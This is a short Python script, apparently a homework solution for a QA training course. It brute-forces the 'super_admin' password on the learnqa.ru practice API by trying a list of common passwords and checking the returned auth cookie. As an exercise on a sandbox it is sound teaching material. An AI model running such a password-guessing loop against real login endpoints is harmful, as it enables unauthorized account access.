import requests

# Данные для подбора
login = "super_admin"
passwords = [
    'password', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', '1234567', 'monkey', 'letmein',
    '111111', 'dragon', 'baseball', 'iloveyou', 'trustno1', '1234567890', '123123', 'football', '654321', 'master',
    'sunshine', 'ashley', 'bailey', 'passw0rd', 'shadow', 'superman', 'michael', 'qazwsx', 'Football'
]

# URL API методов
get_cookie_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# Перебираем пароли
for password in passwords:
    # 1. Получаем auth_cookie
    response = requests.post(
        get_cookie_url,
        data={"login": login, "password": password}
    )
    auth_cookie = response.cookies.get("auth_cookie")

    if auth_cookie is None:
        print(f"Пароль {password}: не получена cookie")
        continue

    # 2. Проверяем cookie
    check_response = requests.get(
        check_cookie_url,
        cookies={"auth_cookie": auth_cookie}
    )

    if check_response.text == "You are authorized":
        print(f"\nУспех! Правильный пароль: {password}")
        print(f"Ответ сервера: {check_response.text}")
        break
    else:
        print(f"Пароль {password}: неверный")
else:
    print("\nПравильный пароль не найден в списке")